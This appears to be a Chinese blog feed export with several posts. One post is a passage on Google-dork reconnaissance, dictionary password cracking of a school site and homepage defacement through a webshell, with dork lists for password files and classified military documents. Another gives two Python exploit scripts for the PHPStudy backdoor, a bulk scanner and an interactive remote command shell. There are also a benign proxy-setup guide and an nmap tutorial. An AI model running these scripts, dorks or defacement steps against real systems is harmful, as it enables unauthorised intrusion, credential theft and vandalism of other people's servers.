<p>再看看有没有上传一类的漏洞：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">site:a2<span class="selector-class">.xxxx</span><span class="selector-class">.com</span> inurl:file</span><br><span class="line"></span><br><span class="line">site:a3<span class="selector-class">.xxxx</span><span class="selector-class">.com</span> inurl:load</span><br></pre></td></tr></table></figure>

<p>在a2上发现一个上传文件的页面：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>a2.xxxx.com<span class="regexp">/sys/u</span>ploadfile.asp</span><br></pre></td></tr></table></figure>

<p>用IE看了一下，没权限访问。试试注射</p>
<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="title">site</span>:a2.xxxx.com file<span class="keyword">type</span>:asp</span><br></pre></td></tr></table></figure>

<p>一般学校的站点的密码都比较有规律，通常都是域名+电话一类的变形</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">site:xxxx<span class="selector-class">.com</span> <span class="comment">//得到N个二级域名</span></span><br><span class="line"></span><br><span class="line">site:xxxx<span class="selector-class">.com</span> intext:@xxxx<span class="selector-class">.com</span> <span class="comment">//得到N个邮件地址，还有邮箱的主人的名字什么的</span></span><br><span class="line"></span><br><span class="line">site:xxxx<span class="selector-class">.com</span> intext:电话 <span class="comment">//N个电话 </span></span><br></pre></td></tr></table></figure>

<p>把这些信息做个字典，挂上慢慢跑。过了一段时间就跑出4个帐号，2个是学生会的，1个管理员，还有一个可能是老师的帐号</p>
<p>google hack其实也都差不多是一些基本语法的灵活运用，或者配合某个脚本漏洞，主要还是靠个人的灵活思维</p>
<p>对于一些在win上跑 apache的应该多注意一下这方面，一个<code>intitle:index of</code>就差不多都出来了 <code>echo “召唤” &gt; index.jsp</code> 现在看看首页，已经被改成: “召唤” 了。</p>
<p>也可以用WGET上传一个文件上去，然后<code>execute Command输入 cat file &gt; index.html or echo “”&gt; file echo “test” &gt;&gt; file</code> 这样一条条打出来，站点首页就成功被替换了</p>
<p>同样的也可以 <code>uname -a;cat /etc/passwd</code> 不过有点要注意，有些WEBSHELL程序有问题，执行不了的，</p>
<h4 id="搜索INC敏感信息"><a href="#搜索INC敏感信息" class="headerlink" title="搜索INC敏感信息"></a>搜索INC敏感信息</h4><p>在google的搜索框中填入: <code>Code: .org filetype:inc</code> </p>
<p>例：常用的google关键字： foo1 foo2 (也就是关联，比如搜索xx公司 xx美女) </p>
<p><code>operator:foo filetype:123</code> 类型 </p>
<p><code>site:foo.com</code> 相对直接看网站更有意思，可以得到许多意外的信息 </p>
<p><code>intext:foo intitle: fooltitle</code> 标题 <code>allinurl:foo</code> 搜索xx网站的所有相关连接。（踩点必备） </p>
<p><code>links:foo </code>不要说就知道是它的相关链接 </p>
<p><code>allintilte:foo.com</code> 可以辅助<code>”-” “+”</code>来调整搜索的精确程度 直接搜索密码：(引号表示为精确搜索)</p>
<p>可以再延伸到上面的结果里进行二次搜索</p>
<p><code>“index of” htpasswd / passwd filetype:xls username password email “ws_ftp.log” “config.php” allinurl:admin mdb service filetype:pwd</code></p>
<p>或者某个比如pcanywhere的密码后缀cif等</p>
<p>再来点更敏感信息 <code>“robots.txt” “Disallow:” filetype:txt inurl:_vti_cnf</code> (FrontPage的关键索引啦，扫描器的CGI库一般都有) </p>
<p><code>allinurl: /msadc/Samples/selector/showcode.asp /../../../passwd /examples/jsp/snp/snoop.jsp phpsysinfo intitle:index of /admin intitle:”documetation” inurl: 5800(vnc的端口)</code></p>
<p>或者desktop port等多个关键字检索 <code>webmin port 10000 inurl:/admin/login.asp intext:　Powered by GBook365 intitle:”php shell” “Enable stderr” filetype:php</code> 直接搜索到phpwebshell</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">foo.org filetype:inc</span><br><span class="line"></span><br><span class="line">ipsec filetype:conf</span><br><span class="line"></span><br><span class="line">intilte:”error occurred” ODBC request <span class="keyword">where</span> (<span class="keyword">select</span>|<span class="keyword">insert</span>) 说白了就是说，可以直接试着查查数据库检索，针对目前流行的<span class="keyword">sql</span>注射</span><br><span class="line"></span><br><span class="line">“Dumping data <span class="keyword">for</span> <span class="keyword">table</span>” username <span class="keyword">password</span></span><br><span class="line"></span><br><span class="line">intitle:”Error <span class="keyword">using</span> Hypernews”</span><br><span class="line"></span><br><span class="line">“<span class="keyword">Server</span> Software”</span><br><span class="line"></span><br><span class="line">intitle:”HTTP_USER_AGENT=Googlebot”</span><br><span class="line"></span><br><span class="line">“HTTP_USER_ANGET=Googlebot” THS <span class="keyword">ADMIN</span></span><br><span class="line"></span><br><span class="line">filetype:.doc site:.mil classified 直接搜索军方相关word</span><br></pre></td></tr></table></figure>
<p>检查多个关键字：</p>
<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="title">intitle</span>:config confixx login password</span><br><span class="line"></span><br><span class="line">“mydomain.com” nessus re<span class="keyword">port</span></span><br><span class="line"></span><br><span class="line">“re<span class="keyword">port</span> generated by”</span><br><span class="line"></span><br><span class="line">“ipconfig”</span><br><span class="line"></span><br><span class="line">“winipconfig”</span><br></pre></td></tr></table></figure>

<p>google缓存利用，搜索时候多”选搜索所有网站”</p>
<p>特别推荐：administrator users 等相关的东西，比如名字，生日等……最惨也可以拿来做字典</p>
<p>一些技巧集合：</p>
<ol>
<li><p>index.of.password</p>
</li>
<li><p>filetype:blt “buddylist”</p>
</li>
<li><p>“access denied for user” “using password”</p>
</li>
<li><p>intitle:”index of” inurl:ftp (pub | incoming)</p>
</li>
<li><p>“http://:@www” domainname</p>
</li>
<li><p>filetype:cnf inurl:_vti_pvt access.cnf</p>
</li>
<li><p>auth_user_file.txt</p>
</li>
<li><p>allinurl:”//_vti_pvt/” | allinurl:”//_vti_cnf/”</p>
</li>
<li><p>The Master List</p>
</li>
<li><p>inurl:”install/install.php”</p>
</li>
<li><p>allinurl: admin mdb</p>
</li>
<li><p>intitle:”welcome.to.squeezebox”</p>
</li>
<li><p>passlist.txt (a better way)</p>
</li>
<li><p>intext:””BiTBOARD v2.0″ BiTSHiFTERS Bulletin Board”</p>
</li>
<li><p>“A syntax error has occurred” filetype:ihtml</p>
</li>
<li><p>intitle:　Login intext:”RT is ? Copyright”</p>
</li>
<li><p>“# -FrontPage-” inurl:service.pwd</p>
</li>
<li><p>ext:php program_listing intitle:MythWeb.Program.Listing</p>
</li>
<li><p>ORA-00921: unexpected end of SQL command</p>
</li>
<li><p>intitle:index.of abyss.conf</p>
</li>
</ol>
]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>google</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac设置虚拟机使用宿主机代理</title>
    <url>/post/24292/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前提：mac 本身已经安装 ss，并且可以通过 ss 科学上网（或者 win 也一样）<br>想要实现：Parallels Desktop 里的虚拟机也想科学上网（或者 win 里安装 vmware 也一样，或者是另一台物理机也是一样的）</p>
<span id="more"></span>

<h3 id="方法一：虚拟机也安装一个-ss-客户端"><a href="#方法一：虚拟机也安装一个-ss-客户端" class="headerlink" title="方法一：虚拟机也安装一个 ss 客户端"></a>方法一：虚拟机也安装一个 ss 客户端</h3><p>对于有窗口的系统，比如你虚拟机里安装的是 win、或者 ubuntu 等，那么再安装一个客户端是很方便的，这就相当于在另一台电脑里使用 ss 客户端，既然 mac 上你会用了，那在其他电脑上也是一样的。</p>
<p>但是如果虚拟机里是最小化安装的纯命令行的 centos，那么使用客户端可能有一定的麻烦，yum 无法安装，pip 安装的感觉也是 ssserver，并没有客户端，所以客户端还得编译，编译还有很多依赖，编译好还得写对配置文件，很多人都不太清楚这个，所以还是挺麻烦的。</p>
<h3 id="方法二：虚拟机设置代理到宿主机"><a href="#方法二：虚拟机设置代理到宿主机" class="headerlink" title="方法二：虚拟机设置代理到宿主机"></a>方法二：虚拟机设置代理到宿主机</h3><p>即虚拟机里设置代理到 mac（这里 mac 就是虚拟机的宿主机），让虚拟机通过 mac 的 ss 科学上网，这里如果宿主机换成 win，虚拟机软件换成 vmware 或 virtualbox，它的原理也都是一样的。</p>
<p><strong>设置方法：</strong></p>
<p>1、首先把宿主机的 ss 设置里的 Local Socks5 Listen Address 由原来的<code>127.0.0.1</code>设置为<code>0.0.0.0</code>，如果需要通过 HTTP 代理，那么也要把 ss 里的 HTTP 选项打开，并把 HTTP proxy Listen Address 地址由原来的<code>127.0.0.1</code>设置为<code>0.0.0.0</code>，这样做表示代理所有 ip，而不只是本机的<code>127.0.0.1</code>。如果用的是其他科学上网工具，也有些写成 “share over LAN(通过局域网共享)”，如果有这个选项，选上了就表示监听<code>0.0.0.0</code>。</p>
<p>2、搞清楚虚拟机是通过什么方式联网的，虚拟机连网无非有两种方式：</p>
<ul>
<li>  桥接</li>
<li>  NAT</li>
</ul>
<p>如果是桥接连网，那么只要找出宿主机的联网 ip 即可（mac 的话，一般都是 wifi，或者通过转接头插网线的话，那就是转接头对应的 ip）</p>
<p>如果是 NAT 连网的，那么要找出宿主机中 NAT 网卡的 ip（在 mac 里使用 parallels desktop 虚拟机的话，NAT 网卡一般是 parallels Shared 开头的）</p>
<p>3、在虚拟机里的<code>~/.bashrc</code>或<code>~/.zshrc</code>里，添加以下两句的其中一句：</p>
<p>一般填入局域网IP即可</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">ALL_PROXY</span>=SOCKS5://IP:端口</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">ALL_PROXY</span>=HTTP://IP:端口</span><br></pre></td></tr></table></figure>

<p>第一句表示使用 SOCKS5 代理，第二句表示使用 HTTP 代理，ip 就是第 2 步中找到的 ip，端口就是 ss 对应的端口，打开 ss 的设置里就有，一般 ss 有两个端口，一个 socks5 端口，一个 http 端口，找到对应端口填进去即可。</p>
<p>最后 source 一下配置文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>
<p>或者用 zsh shell 的话就是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>

<p>测试 ip 是哪里的：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl https:<span class="regexp">//i</span>p.cn</span><br></pre></td></tr></table></figure>

<p>如果显示的是代理服务器所在地址 (比如美国) 和 ip，那说明代理设置成功。</p>
<p>然后试试能否访问 google：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl https:<span class="regexp">//</span>www.google.com</span><br></pre></td></tr></table></figure>

<p>如果是 Windows，可以直接在 cmd 里设用<code>set http_proxy=http://127.0.0.1:1087</code>，<code>set https_proxy=http://127.0.0.1:1087</code>，<code>set all_proxy=http://127.0.0.1:1087</code></p>
<hr>
<p>更好的写法</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置使用代理</span></span><br><span class="line"><span class="built_in">alias</span> setproxy=<span class="string">&quot;export https_proxy=http://127.0.0.1:1087; export http_proxy=http://127.0.0.1:1087; export all_proxy=socks5://127.0.0.1:1086; echo &#x27;Set proxy successfully&#x27;&quot;</span></span><br><span class="line"><span class="comment"># 设置取消使用代理</span></span><br><span class="line"><span class="built_in">alias</span> unsetproxy=<span class="string">&quot;unset http_proxy; unset https_proxy; unset all_proxy; echo &#x27;Unset proxy successfully&#x27;&quot;</span></span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>科学上网</category>
      </categories>
      <tags>
        <tag>mac</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPStudy后门rec批量利用脚本</title>
    <url>/post/12551/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>北京时间9月20日，杭州公安发布《杭州警方通报打击涉网违法犯罪暨‘净网2019’专项行动战果》一文，文章曝光了国内知名PHP调试环境程序集成包“PhpStudy软件”遭到黑客篡改并植入“后门”。截至案发，近百万PHP用户中超过67万用户已被黑客控制，并大肆盗取账号密码、聊天记录、设备码类等敏感数据多达10万多组，非法牟利600多万元。</p>
<span id="more"></span>

<h3 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">files=<span class="built_in">input</span>(<span class="string">&#x27;files:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_shell</span>(<span class="params">url</span>):</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;echo md5(123);&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = base64.b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;accept-charset&#x27;</span>: payload,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip,deflate&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        r = requests.get(url=url+<span class="string">&#x27;/index.php&#x27;</span>, headers=headers, verify=<span class="literal">False</span>,timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;202cb962ac59075b964b07152d234b70&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;[ + ] BackDoor successful: &#x27;</span>+url+<span class="string">&#x27;===============[ + ]\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(files+<span class="string">&#x27;.success.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">                    f.write(url+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;[ - ] BackDoor failed: &#x27;</span>+url+<span class="string">&#x27;[ - ]\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[ - ] Timeout: &#x27;</span>+url+<span class="string">&#x27; [ - ]\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(files,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">        lines = f.read().splitlines()</span><br><span class="line"></span><br><span class="line">        task_pool=threadpool.ThreadPool(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">        requests=threadpool.makeRequests(write_shell,lines)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> req <span class="keyword">in</span> requests:</span><br><span class="line"></span><br><span class="line">        task_pool.putRequest(req)</span><br><span class="line"></span><br><span class="line">        task_pool.wait()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="交互Shell"><a href="#交互Shell" class="headerlink" title="交互Shell"></a>交互Shell</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;======Phpstudy Backdoor Exploit---os-shell============\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;===========By  Qing=================\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=====Blog：https://www.cnblogs.com/-qing-/==\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">os_shell</span>(<span class="params">url,headers,payload</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url=url+<span class="string">&#x27;/phpinfo.php&#x27;</span>,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        res = re.findall(<span class="string">&quot;qing(.*?)qing&quot;</span>,r.text,re.S)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[ + ]===========The Response:==========[ + ]\n&quot;</span>)</span><br><span class="line">        res = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[ - ]===========Failed! Timeout...==========[ - ]\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;input the Url , example:\&quot;http://127.0.0.1/\&quot;\n&quot;</span>)</span><br><span class="line">    payload = <span class="built_in">input</span>(<span class="string">&quot;input the payload , default:echo system(\&quot;whoami\&quot;);\n&quot;</span>)</span><br><span class="line">    de_payload = <span class="string">&quot;echo \&quot;qing\&quot;;system(\&quot;whoami\&quot;);echo \&quot;qing\&quot;;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> payload.strip() == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        payload = de_payload</span><br><span class="line">    payload = <span class="string">&quot;echo \&quot;qing\&quot;;&quot;</span>+payload+<span class="string">&quot;echo \&quot;qing\&quot;;&quot;</span></span><br><span class="line">    payload = base64.b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    payload = <span class="built_in">str</span>(payload, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;accept-charset&#x27;</span>: payload,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip,deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    os_shell(url=url,headers=headers,payload=payload)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>PHPStudy</tag>
      </tags>
  </entry>
  <entry>
    <title>nmap基本使用</title>
    <url>/post/5820/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Nmap 是个端口扫描器，这意味着它可以向一些指定 IP 的 TCP 或 UDP 端口发送封包，并检查是否有响应。如果有的话，这意味着端口是打开的，因此，端口上运行着服务</p>
<p>Nmap代表Network Mapper，是一款用于网络探索和安全审计的开源工具，它与Kali Linux标准兼容，但也可用于Windows，OSX和许多其他UNIX平台。Nmap还有一个称为Zenmap的图形用户界面。</p>
<span id="more"></span>

<h4 id="打开端口扫描和操作系统检测"><a href="#打开端口扫描和操作系统检测" class="headerlink" title="打开端口扫描和操作系统检测"></a>打开端口扫描和操作系统检测</h4><p>使用以下命令确定活动主机：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sP <span class="number">192.168.0.0</span>-<span class="number">100</span></span><br></pre></td></tr></table></figure>

<p>使用以下命令在其中一个实时主机上启动带有操作系统检测的SYN扫描</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">nmap -<span class="built_in">sS</span> [<span class="built_in">IP</span>地址] -O</span><br></pre></td></tr></table></figure>

<p>使用以下命令启动一个开放端口扫描和版本检测</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">nmap -sV <span class="number">192.168.0.1</span> -<span class="keyword">A</span></span><br></pre></td></tr></table></figure>

<p>将-v添加到命令中时，可以增加冗长度</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">nmap -sV <span class="number">192.168.0.13</span> -<span class="keyword">A</span> -v</span><br></pre></td></tr></table></figure>



<h4 id="服务器是否响应-ping，或者服务器是否打开"><a href="#服务器是否响应-ping，或者服务器是否打开" class="headerlink" title="服务器是否响应 ping，或者服务器是否打开"></a>服务器是否响应 ping，或者服务器是否打开</h4><p>使用-sn参数，我们让 Nmap 只检查是否服务器响应 ICMP 请求（或 ping）</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sn <span class="number">192.168.56.102</span></span><br></pre></td></tr></table></figure>

<h4 id="打开了哪些端口"><a href="#打开了哪些端口" class="headerlink" title="打开了哪些端口"></a>打开了哪些端口</h4><p>调用 Nmap 的最简方式，它只指定目标 IP。所做的事情是先 ping 服务器，如果它响应了，Nmap 会向 1000 个 TCP 端口列表发送探针，来观察哪个端口响应，之后报告响应端口的结果</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> <span class="number">192.168.56.102</span></span><br></pre></td></tr></table></figure>


<h4 id="Nmap-向服务器询问正在运行的服务的版本，并且基于它猜测操作系统"><a href="#Nmap-向服务器询问正在运行的服务的版本，并且基于它猜测操作系统" class="headerlink" title="Nmap 向服务器询问正在运行的服务的版本，并且基于它猜测操作系统"></a>Nmap 向服务器询问正在运行的服务的版本，并且基于它猜测操作系统</h4><ul>
<li><p>sV请求每个被发现的开放端口的标识（头部或者自我识别），这是它用作版本的东西。</p>
</li>
<li><p>O告诉 Nmap，尝试猜测运行在目标上的操作系统。使用开放端口和版本收集的信息。</p>
</li>
</ul>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sV -O <span class="number">192.168.56.10</span></span><br></pre></td></tr></table></figure>

<h4 id="更加清楚的查看这个端口，并且看看可以确认什么"><a href="#更加清楚的查看这个端口，并且看看可以确认什么" class="headerlink" title="更加清楚的查看这个端口，并且看看可以确认什么"></a>更加清楚的查看这个端口，并且看看可以确认什么</h4><p>使用此命令，让 nmap 在主机上的 FTP 端口（-p 21）上运行其默认脚本（-sC）</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sC <span class="number">192.168.56.102</span> -p <span class="number">21</span></span><br></pre></td></tr></table></figure>

<h4 id="Nmap-包含了一些脚本，用于测试-WAF-的存在"><a href="#Nmap-包含了一些脚本，用于测试-WAF-的存在" class="headerlink" title="Nmap 包含了一些脚本，用于测试 WAF 的存在"></a>Nmap 包含了一些脚本，用于测试 WAF 的存在</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">map</span> -p <span class="number">80</span>,<span class="number">443</span> --script=http-waf-detect <span class="number">192.168.56.102</span></span><br></pre></td></tr></table></figure>

<h4 id="另一个-Nmap-脚本，可以帮助我们识别所使用的设备，并更加精确"><a href="#另一个-Nmap-脚本，可以帮助我们识别所使用的设备，并更加精确" class="headerlink" title="另一个 Nmap 脚本，可以帮助我们识别所使用的设备，并更加精确"></a>另一个 Nmap 脚本，可以帮助我们识别所使用的设备，并更加精确</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p <span class="number">80</span>,<span class="number">443</span> --script=http-waf-fingerprint www.example.com</span><br></pre></td></tr></table></figure>


<h4 id="有一些其它的实用参数："><a href="#有一些其它的实用参数：" class="headerlink" title="有一些其它的实用参数："></a>有一些其它的实用参数：</h4><ul>
<li><p>sT：通常，在 root 用户下运行 Nmap 时，它使用 SYN 扫描类型。使用这个参数，我们就强制让扫描器执行完全连接的扫描。它更慢，并且会在服务器的日志中留下记录，但是它不太可能被入侵检测系统检测到。</p>
</li>
<li><p>Pn：如果我们已经知道了主机是活动的或者不响应 ping，我们可以使用这个参数告诉 Nmap 跳过 ping 测试，并扫描所有指定目标，假设它们是开启的。</p>
</li>
<li><p>v：这会开启详细模式。Nmap 会展示更多关于它所做事情和得到回复的信息。参数可以在相同命令中重复多次：次数越多，就越详细（也就是说，-vv或-v -v -v -v）。</p>
</li>
<li><p>p N1,N2,Nn：如果我们打算测试特定端口或一些非标准端口，我们可能想这个参数。N1到Nn是打算让 Nmap 扫描的端口。例如，要扫描端口 21，80 到 90，和 137，参数应为：-p 21,80-90,137。</p>
</li>
<li><p>–script=script_name：Nmap 包含很多实用的漏洞检测、扫描和识别、登录测试、命令执行、用户枚举以及其它脚本。使用这个参数来告诉 Nmap 在目标的开放端口上运行脚本。查看一些 Nmap 脚本，它们在：<a href="https://nmap.org/nsedoc/scripts/%E3%80%82">https://nmap.org/nsedoc/scripts/。</a></p>
</li>
</ul>
<h3 id="Nmap选项摘要"><a href="#Nmap选项摘要" class="headerlink" title="Nmap选项摘要"></a>Nmap选项摘要</h3><p><strong>用法：nmap [扫描类型] [选项] {目标规格}</strong></p>
<h4 id="目标规格："><a href="#目标规格：" class="headerlink" title="目标规格："></a>目标规格：</h4><p>可以传递主机名，IP地址，网络等。<br>例如：scanme.nmap.org，microsoft.com/24,192.168.0.1; 10.0.0-255.1-254</p>
<ul>
<li>-iL <inputfilename>：从主机/网络列表中输入</li>
<li>-iR <num hosts>：选择随机目标</li>
<li>-exclude &lt;host1 [，host2] [，host3]，…&gt;：排除主机/网络</li>
<li>-excludefile <exclude_file>：从文件中排除列表</li>
</ul>
<h4 id="主机发现："><a href="#主机发现：" class="headerlink" title="主机发现："></a>主机发现：</h4><ul>
<li>-sL：列表扫描 – 仅列出要扫描的目标</li>
<li>-sn：Ping扫描 – 禁用端口扫描</li>
<li>-Pn：将所有主机视为联机 – 跳过主机发现</li>
<li>-PS / PA / PU / PY [portlist]：TCP SYN / ACK / UDP / SCTP发现到指定端口</li>
<li>-PE / PP / PM：ICMP回显，时间戳和网络掩码请求发现探测</li>
<li>-PO [协议列表]：IP协议Ping</li>
<li>-n / -R：从不执行DNS解析/总是解析[默认：有时]</li>
<li>-dns-servers &lt;serv1 [，serv2]，…&gt;：指定自定义DNS服务器</li>
<li>-system-dns：使用操作系统的DNS解析器</li>
<li>-traceroute：每个主机的跟踪跳转路径</li>
</ul>
<h4 id="SCAN技术："><a href="#SCAN技术：" class="headerlink" title="SCAN技术："></a>SCAN技术：</h4><ul>
<li>-sS / sT / sA / sW / sM：TCP SYN / Connect（）/ ACK / Window / Maimon扫描</li>
<li>-sU：UDP 扫描-sN</li>
<li>/ sF / sX：TCP Null，FIN和Xmas扫描</li>
<li>–scanflags &lt; flags&gt;：自定义TCP扫描标志</li>
<li>-sI &lt;zombie host [：probeport]&gt;：空闲扫描</li>
<li>-sY / sZ：SCTP INIT / COOKIE-ECHO扫描</li>
<li>-sO：IP协议扫描</li>
<li>-b &lt;FTP中继主机&gt;：FTP反弹扫描</li>
</ul>
